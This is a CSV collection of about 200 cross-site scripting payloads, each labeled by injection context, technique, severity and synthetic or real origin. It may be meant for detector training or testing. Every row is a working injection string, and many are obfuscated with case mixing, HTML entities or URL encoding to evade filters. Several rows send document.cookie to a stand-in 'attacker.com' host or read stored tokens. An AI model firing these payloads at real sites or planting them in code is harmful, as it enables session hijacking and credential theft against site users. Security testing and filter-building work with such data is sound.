payload,context,technique,severity,length,source
"`%3E%3Cimg src=x onmouseenter=console.log(String.fromCharCode(88,83,83))%3E",attribute_escape,synthetic,high,75,synthetic
`><Img srC=x onAniMatIonEnd=coNfiRm(1)>,attribute_escape,synthetic,medium,39,synthetic
%27 ><svg ontouchmove=prompt(%27XSS%27)>,attribute_escape,synthetic,medium,40,synthetic
OnaNimAtiOniTerAtiOn=ConFirM('XSS'),event_handler,synthetic,medium,35,synthetic
%22%3E%3Csvg%20onmouseover%3d%22confirm%26%230000000040document.domain),dom_sink,url_encoding,low,71,real
\%27 onblur=console.log(document.domain)//,attribute_escape,synthetic,medium,42,synthetic
"<m&#97;rqu&#101;&#101; x=y onpromptdismiss=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection,synthetic,low,100,synthetic
%22 onfocusin=prompt(1) %22,attribute_escape,synthetic,medium,27,synthetic
<!--><plaintext onrepeat=prompt('XSS')>,tag_injection,synthetic,medium,39,synthetic
""" ><svG oNmoUseOveR=cOnfIrm('XSS')>",attribute_escape,synthetic,medium,35,synthetic
#alErt(1),template_injection,synthetic,medium,9,synthetic
{php}alert(document.cookie){/php},template_injection,synthetic,high,33,synthetic
"\"" ondblclick=alert(1)//",attribute_escape,synthetic,medium,24,synthetic
ong&#101;stur&#101;st&#97;rt=confirm(docum&#101;nt.dom&#97;in),event_handler,synthetic,medium,62,synthetic
%3Caudio/onplay=console.log(1)%3E,tag_injection,synthetic,medium,33,synthetic
<&#97;r&#101;&#97;	onclos&#101;=prompt(1)>,tag_injection,synthetic,medium,42,synthetic
"Obj&#101;ct.&#97;ssign(window,{""onb&#101;for&#101;copy"":prompt})",dom_sink,synthetic,low,64,synthetic
<auDio srC=x onInpUt=ProMpt(loCatIon.haSh)>,tag_injection,synthetic,medium,43,synthetic
"'><Img srC=x onVolUmeChaNge=prOmpT(STriNg.FroMChArCOde(88,83,83))>",attribute_escape,synthetic,high,66,synthetic
__proto__[%22onwebkitanimationend%22]=alert(%27XSS%27),dom_sink,synthetic,medium,54,synthetic
"""><img src=x onfocusout=consol&#101;.log(loc&#97;tion.h&#97;sh)>",attribute_escape,synthetic,low,64,synthetic
"\"" onpagehide=prompt('XSS')//",attribute_escape,synthetic,medium,29,synthetic
OnrEpeAt=AleRt('XSS'),event_handler,synthetic,medium,21,synthetic
%3Cscript	%3Eprompt(document.domain)%3C/script%3E,script_injection,synthetic,medium,49,synthetic
"<script onmouseleave=""alert(1)"">AnonKryptiQuz</script>",script_injection,none,medium,54,real
"<animatetransform
onpointermove=console.log('XSS')>",tag_injection,synthetic,medium,51,synthetic
"location=""javascript:prompt(document.cookie+'&loc='+location.href)""",dom_sink,synthetic,high,67,synthetic
"data:text/html,%3Cscript%3Econfirm(document.domain)%3C/script%3E",js_uri,synthetic,medium,64,synthetic
"<a href=""\xE2\x80\x85javascript:javascript:alert(9704)"" id=""fuzzelement1"">test</a>",js_uri,none,medium,82,real
"<meta onkeydown=""alert(1)"" contenteditable>AnonKryptiQuz</meta>",tag_injection,none,medium,63,real
%22 ><svg onplaying=alert(location.hash)>,attribute_escape,synthetic,medium,41,synthetic
"'><scr	ipt>alert(String.fromCharCode(88,83,83))</scr	ipt>",script_injection,synthetic,high,57,synthetic
"""><Img srC=x onTouChmOve=coNfiRm(DocUmeNt.DomAin)>",attribute_escape,synthetic,medium,50,synthetic
' ><svG oNweBkiTfuLlsCreEncHanGe=AleRt('XSS')>,attribute_escape,synthetic,medium,46,synthetic
%3Ctr	onfocus=confirm('XSS')%3E,tag_injection,synthetic,medium,31,synthetic
<blink id=x tabindex=1 onbeforeactivate=alert(1)></blink>,tag_injection,none,medium,57,real
"<abbr draggable=""true"" ondragleave=""alert(1)"">AnonKryptiQuz</abbr>",tag_injection,none,medium,66,real
"<style>@keyframes x{}</style><dfn style=""animation-name:x"" onanimationend=""alert(1)""></dfn>",tag_injection,none,medium,91,real
onplaying=alert/*x*/(1),event_handler,synthetic,low,23,synthetic
' %3E%3Csvg onpause=confirm('XSS')%3E,attribute_escape,synthetic,medium,37,synthetic
"<div draggable=""true"" contenteditable>drag me</div><data ondrop=alert(1) contenteditable style=display:block>drop here</data>",tag_injection,none,medium,125,real
"location.href=""javascr	ipt:alert(document.cookie+'&loc='+location.href)""",dom_sink,synthetic,high,72,synthetic
"<dialog onbeforecut=""alert(1)"" contenteditable>AnonKryptiQuz</dialog>",tag_injection,none,medium,69,real
	ondrop=console.log(document.domain),event_handler,synthetic,medium,36,synthetic
"	onFulLscReeNchAngE=aLerT(STriNg.FroMChArCOde(88,83,83))",event_handler,synthetic,high,56,synthetic
"<style>:target {color: red;}</style><sub id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></sub>",tag_injection,none,medium,109,real
"window[""&#101;v&#97;l""]('//&#97;tt&#97;ck&#101;r.com/?c='+docum&#101;nt.cooki&#101;)",dom_sink,synthetic,low,84,synthetic
<div onblur=alert(1) tabindex=1 id=x></div><input autofocus>,tag_injection,none,medium,60,real
"%3Cxss
onkeypress=console.log(1)%3E",tag_injection,synthetic,medium,35,synthetic
%22><img src=x onended=console.log(1)>,attribute_escape,synthetic,medium,38,synthetic
'%3E%3Cimg src=x onselect=prompt(1)%3E,attribute_escape,synthetic,medium,38,synthetic
&quot; onwheel=alert(%27XSS%27) x=&quot;,attribute_escape,synthetic,medium,40,synthetic
"<object onError object onError=""javascript:javascript:alert(1)""></object onError>",js_uri,none,medium,81,real
"DatA:tExt/htMl,<scRipT>aLerT(lOcaTioN.hAsh)</ScrIpt>",js_uri,synthetic,medium,52,synthetic
"__proto__[""ongotpoint&#101;rc&#97;ptur&#101;""]=&#97;l&#101;rt(n&#97;vig&#97;tor.s&#101;ndB&#101;&#97;con('//&#97;tt&#97;ck&#101;r.com',docum&#101;nt.cooki&#101;))",dom_sink,synthetic,low,162,synthetic
OnsTalLed=prOmpT(1),event_handler,synthetic,medium,19,synthetic
"<progress onpaste=""alert(1)"" contenteditable>AnonKryptiQuz</progress>",tag_injection,none,medium,69,real
"<style>@keyframes x{}</style><content style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></content>",tag_injection,none,medium,107,real
"""><img src=x ontoggl&#101;=confirm('XSS')>",attribute_escape,synthetic,medium,42,synthetic
"\"" on&#101;nd&#101;d=&#97;l&#101;rt(1)//",attribute_escape,synthetic,low,40,synthetic
"\"" OnsCroLleNd=AleRt(StrIng.frOmCHarCodE(88,83,83))//",attribute_escape,synthetic,high,53,synthetic
OndRagOveR=cOnfIrm&#40;1&#41;,event_handler,synthetic,low,29,synthetic
"<header onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</header>",tag_injection,none,medium,85,real
"s&#101;tTim&#101;out(""confirm('XSS')"",0)",dom_sink,synthetic,medium,40,synthetic
"<body ondblclick=""alert(1)"">AnonKryptiQuz</body>",tag_injection,none,medium,48,real
<kbd onpointerout=alert(1) style=display:block>AnonKryptiQuz</kbd>,tag_injection,none,medium,66,real
<listing	onk&#101;yup=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>,tag_injection,synthetic,low,60,synthetic
"element.insertAdjacentHTML(""beforeend"",""%3Cimg src=x onerror=console.log('XSS')%3E"")",dom_sink,synthetic,medium,84,synthetic
<obJecT/oNtoUchStaRt=ConSolE.lOg(LocAtiOn.HasH)>,tag_injection,synthetic,medium,48,synthetic
%22><animatemotion ondblclick=console.log(1)>,tag_injection,synthetic,medium,45,synthetic
"%27 ><svg onload=alert(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,54,synthetic
<plaintext onrepeat=prompt('XSS') onrepeat=prompt('XSS')>,tag_injection,synthetic,medium,57,synthetic
eval(%22confirm(1)%22),dom_sink,synthetic,medium,22,synthetic
${pRomPt?New()('1')},template_injection,synthetic,low,20,synthetic
"element.setAttribute(%22onclick%22,%22confirm(document.cookie+%27&loc=%27+location.href)%22)",dom_sink,synthetic,high,92,synthetic
"<ul draggable=""true"" ondragenter=""alert(1)"">AnonKryptiQuz</ul>",tag_injection,none,medium,62,real
"<a href=""javas\x09cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",js_uri,none,medium,71,real
<baSe Src=x OniNpuT=aLerT('XSS')>,tag_injection,synthetic,medium,33,synthetic
%3Caudio/onpause=console.log(document.domain)%3E,tag_injection,synthetic,medium,48,synthetic
"\"" OnpOinTerUp=AleRt(1)//",attribute_escape,synthetic,medium,25,synthetic
""" onpopstate=alert('XSS') """,attribute_escape,synthetic,medium,27,synthetic
' oNprOmpTacTioN=pRomPt(1) ',attribute_escape,synthetic,medium,28,synthetic
"""><img src=x onended=confirm(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,60,synthetic
"""oncut=alert(1)",attribute_escape,none,medium,15,real
%3Ctemplate onclose=console.log(1)/%3E,tag_injection,synthetic,medium,38,synthetic
"<span
onbeforetoggle=prompt(location.hash)>",tag_injection,synthetic,medium,43,synthetic
""" oNblUr=ProMpt('XSS') """,attribute_escape,synthetic,medium,24,synthetic
"<cite onmousedown=""alert(1)"">AnonKryptiQuz</cite>",tag_injection,none,medium,49,real
'><img src=x oncopy=confirm(location.hash)>,attribute_escape,synthetic,medium,43,synthetic
'><img src=x oninv&#97;lid=confirm(1)>,attribute_escape,synthetic,medium,38,synthetic
""" ><svg onprompt&#97;ction=confirm(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape,synthetic,medium,75,synthetic
<liNk OnwAitIng=coNfiRm(1)>,tag_injection,synthetic,medium,27,synthetic
ontr&#97;nsitionst&#97;rt=consol&#101;.log&#40;'XSS'&#41;,event_handler,synthetic,low,57,synthetic
"__pRotO__[""oNbeForEpaSte""]=FetCh(DocUmeNt.CooKie+'&Loc='+LocAtiOn.HreF)",dom_sink,synthetic,high,71,synthetic
"<html onmousedown=""alert(1)"">AnonKryptiQuz</html>",tag_injection,none,medium,49,real
"\"" onpoint&#101;rov&#101;r=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))//",attribute_escape,synthetic,low,85,synthetic
"<script
>prompt(1)</script>",script_injection,synthetic,medium,27,synthetic
onfocusout=javascript:confirm(%27XSS%27),event_handler,synthetic,medium,40,synthetic
<&#101;mb&#101;d x=y onmozfullscr&#101;&#101;nch&#97;ng&#101;=confirm(loc&#97;tion.h&#97;sh)>,tag_injection,synthetic,medium,93,synthetic
"""><Set onFocUs=ProMpt(doCumEnt.doMaiN)>",tag_injection,synthetic,medium,39,synthetic
"docum&#101;nt.qu&#101;ryS&#101;l&#101;ctor(""body"").inn&#101;rHTML+=""&#97;l&#101;rt('XSS')""",dom_sink,synthetic,low,90,synthetic
j&#97;v&#97;	script:consol&#101;.log(loc&#97;tion.h&#97;sh),js_uri,synthetic,low,59,synthetic
"<hr onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</hr>",tag_injection,none,medium,62,real
"' ><svg onfocus=console.log(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,59,synthetic
"`""'><img src=xxx:x onerror\x0B=javascript:alert(1)>",js_uri,none,medium,51,real
"__proto__[""ontr&#97;nsitionrun""]=f&#101;tch(n&#97;vig&#97;tor.s&#101;ndB&#101;&#97;con('//&#97;tt&#97;ck&#101;r.com',docum&#101;nt.cooki&#101;))",dom_sink,synthetic,low,144,synthetic
`><img src=x onmouseover=prompt(1)>,attribute_escape,synthetic,medium,35,synthetic
<diAloG	oNenDed=coNsoLe.Log(1)>,tag_injection,synthetic,medium,31,synthetic
"<strike onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</strike>",tag_injection,none,medium,65,real
<datalist onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</datalist>,tag_injection,none,medium,82,real
"""><listing onw&#101;bkit&#97;nim&#97;tion&#101;nd=consol&#101;.log('XSS')>",tag_injection,synthetic,low,74,synthetic
<script> document.getElementById(%22safe123%22).setCapture(); document.getElementById(%22safe123%22).click(); </script>,dom_sink,url_encoding,low,119,real
%22 ><svg onpopstate=alert(%27XSS%27)>,attribute_escape,synthetic,medium,38,synthetic
"%22 ><svg ontouchstart=alert(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,60,synthetic
(new Function(%22alert(location.hash)%22))();,dom_sink,synthetic,high,45,synthetic
"<!--[if<img src=x onerror=alert(2)//]> -->//[""'`-->]]>]</div>",tag_injection,comment_injection,medium,61,real
"DocUmeNt.WriTe(""<iMg Src=x OneRroR=cOnsOle.loG(dOcuMenT.cOokIe)>"")",dom_sink,synthetic,high,66,synthetic
"<bdi onmouseout=""alert(1)"" style=display:block>AnonKryptiQuz</bdi>",tag_injection,none,medium,66,real
<scRipT>pRomPt(DocUmeNt.DomAin)</ScrIpt>,script_injection,synthetic,medium,40,synthetic
"java
script:prompt(String.fromCharCode(88,83,83))",js_uri,synthetic,high,49,synthetic
%27><img src=x onpointerdown=console.log(document.domain)>,attribute_escape,synthetic,medium,58,synthetic
<script>Function(%27alert(%27XSS%27)%27)();</script>,script_injection,synthetic,medium,52,synthetic
<fieldset onpointermove=alert(1) style=display:block>AnonKryptiQuz</fieldset>,tag_injection,none,medium,77,real
"location=""javascr	ipt:prompt(document.cookie)""",dom_sink,synthetic,high,46,synthetic
`><img src=x onpoint&#101;rup=&#97;l&#101;rt(1)>,attribute_escape,synthetic,low,48,synthetic
"<b&#97;s&#101;
ontr&#97;nsitionst&#97;rt=prompt(loc&#97;tion.h&#97;sh)>",tag_injection,synthetic,medium,71,synthetic
"' ><svG oNgoTpoIntErcAptUre=coNfiRm(StrIng.frOmCHarCodE(88,83,83))>",attribute_escape,synthetic,high,67,synthetic
"<bdi oncontextmenu=""alert(1)"" style=display:block>AnonKryptiQuz</bdi>",tag_injection,none,medium,69,real
location.href=%22javascript:alert(document.cookie+%27&loc=%27+location.href)%22,dom_sink,synthetic,high,79,synthetic
onmous&#101;down=&#97;l&#101;rt(1),event_handler,synthetic,low,34,synthetic
JavAscRipT:aLerT/*X*/(loCatIon.haSh),js_uri,synthetic,low,36,synthetic
\' onbeforetoggle=confirm(location.hash)//,attribute_escape,synthetic,medium,42,synthetic
<&#97;udio onp&#97;us&#101;=consol&#101;.log(docum&#101;nt.dom&#97;in) onp&#97;us&#101;=consol&#101;.log(docum&#101;nt.dom&#97;in)>,tag_injection,synthetic,low,131,synthetic
'><img src=x onanimationiteration=console.log(document.domain)>,attribute_escape,synthetic,medium,63,synthetic
	onTraNsiTioNruN=cOnfIrm(1),event_handler,synthetic,medium,27,synthetic
<table ontouchend=prompt(document.domain)/>,tag_injection,synthetic,medium,43,synthetic
"Obj&#101;ct.&#97;ssign(window,{""ontoggl&#101;"":XMLHttpR&#101;qu&#101;st})",dom_sink,synthetic,high,73,synthetic
"""><script>&#97;l&#101;rt(loc&#97;tion.h&#97;sh)</script>",script_injection,synthetic,low,56,synthetic
"<wbr draggable=""true"" ondragleave=""alert(1)"" style=display:block>AnonKryptiQuz</wbr>",tag_injection,none,medium,84,real
"""%3E%3Cxss onanimationstart=confirm(String.fromCharCode(88,83,83))%3E",tag_injection,synthetic,high,69,synthetic
<noScrIpt x=Y oNpoIntErdOwn=prOmpT(dOcuMenT.dOmaIn)>,tag_injection,synthetic,medium,52,synthetic
onkeydown=javascript:confirm(location.hash),event_handler,synthetic,medium,43,synthetic
"%3Ciframe	ongestureend=console.log(String.fromCharCode(88,83,83))%3E",tag_injection,synthetic,high,68,synthetic
#'-alert(1)-',generic,none,medium,13,real
<noscript onpoint&#101;rdown=prompt(docum&#101;nt.dom&#97;in)>,tag_injection,synthetic,medium,62,synthetic
<svg id=x;onload=alert(1)>,tag_injection,none,medium,26,real
OnbEfoRetOggLe=ProMpt&#40;'XSS'&#41;,event_handler,synthetic,low,36,synthetic
<foRm	OnrEseT=cOnsOle.loG(dOcuMenT.dOmaIn)>,tag_injection,synthetic,medium,43,synthetic
"%3C!--%3E%3Canimatetransform ondragover=console.log(String.fromCharCode(88,83,83))%3E",tag_injection,synthetic,high,85,synthetic
"<script>console.log(String.fromCharCode(88,83,83))</script>",script_injection,synthetic,high,59,synthetic
&#106;avascr	ipt:confirm('XSS'),js_uri,synthetic,medium,31,synthetic
<hr onpointerup=alert(1) style=display:block>AnonKryptiQuz</hr>,tag_injection,none,medium,63,real
' oNtoUchStaRt=ProMpt(doCumEnt.doMaiN) ',attribute_escape,synthetic,medium,40,synthetic
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><svg id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></svg>",tag_injection,none,medium,176,real
"\' OnpOinTerOveR=cOnsOle.loG(STriNg.FroMChArCOde(88,83,83))//",attribute_escape,synthetic,high,61,synthetic
"<style>@keyframes slidein {}</style><template style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></template>",tag_injection,none,medium,170,real
"<figcaption onmouseout=""alert(1)"">AnonKryptiQuz</figcaption>",tag_injection,none,medium,60,real
&quot; onpopst&#97;t&#101;=&#97;l&#101;rt(docum&#101;nt.dom&#97;in) x=&quot;,attribute_escape,synthetic,low,76,synthetic
"<style>:target {transform: rotate(180deg);}</style><input id=x style=""transition:transform 2s"" ontransitionrun=print()></input>",tag_injection,none,low,127,real
<output id=x tabindex=1 onfocus=alert(1)></output>,tag_injection,none,medium,50,real
&quot; onbeforeinput=console.log(document.domain) x=&quot;,attribute_escape,synthetic,medium,58,synthetic
"""><Img srC=x onBefOreCopY=pRomPt(LocAtiOn.HasH)>",attribute_escape,synthetic,medium,48,synthetic
javascr	ipt:console.log/*x*/(document.domain),js_uri,synthetic,low,45,synthetic
<bdo onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</bdo>,tag_injection,none,medium,72,real
"<frameset onkeydown=""alert(1)"" contenteditable>AnonKryptiQuz</frameset>",tag_injection,none,medium,71,real
"WinDow[""pRomPt""](bToa(doCumEnt.coOkiE))",dom_sink,synthetic,high,39,synthetic
<object onerror=alert(1) data=1 type=image/gif>,tag_injection,none,medium,47,real
%22><img src=x oncanplay=console.log(location.hash)>,attribute_escape,synthetic,medium,52,synthetic
' onhashchange=console.log(document.domain) ',attribute_escape,synthetic,medium,45,synthetic
<audio onscrollend=prompt(location.hash)>,tag_injection,synthetic,medium,41,synthetic
"<style>@keyframes x{}</style><code style=""animation-name:x"" onanimationend=""alert(1)""></code>",tag_injection,none,medium,93,real
onmozfullscreenchange=javascript:console.log(document.domain),event_handler,synthetic,medium,61,synthetic
 onpointermove=alert(document.domain),event_handler,synthetic,medium,37,synthetic
"<keygen draggable=""true"" ondragexit=""alert(1)"" style=display:block>AnonKryptiQuz</keygen>",tag_injection,none,medium,89,real
<img/&#09;&#10;&#11; src=`~` onerror=prompt(1)>,tag_injection,html_entity|whitespace_obfuscation,medium,47,real
onstalled=prompt&#40;1&#41;,event_handler,synthetic,low,27,synthetic
%3Cbase	onbeforecopy=console.log(location.hash)%3E,tag_injection,synthetic,medium,50,synthetic
<foRm OnpAgeRevEal=coNsoLe.Log(loCatIon.haSh)>,tag_injection,synthetic,medium,46,synthetic
#<script>prompt(document.domain)</script>,dom_sink,none,medium,41,real
\' ondragenter=console.log(1)//,attribute_escape,synthetic,medium,31,synthetic
onpopstate=confirm(%27XSS%27),event_handler,synthetic,medium,29,synthetic
<meTa OnsEcuRitYpoLicYviOlaTioN=pRomPt('XSS')/>,tag_injection,synthetic,medium,47,synthetic
"<script>x=""""-prompt(9)-"""";y=42;</script>",script_injection,none,medium,40,real
"setTimeout(""\u0061lert(localStorage.getItem('token'))"",0)",dom_sink,synthetic,high,57,synthetic
"<style>:target {transform: rotate(180deg);}</style><aside id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></aside>",tag_injection,none,medium,128,real
"<maTh
OndRagOveR=pRomPt(1)>",tag_injection,synthetic,medium,27,synthetic
"loc&#97;tion=""j&#97;v&#97;script:consol&#101;.log(n&#97;vig&#97;tor.s&#101;ndB&#101;&#97;con('//&#97;tt&#97;ck&#101;r.com',docum&#101;nt.cooki&#101;))""",dom_sink,synthetic,low,151,synthetic
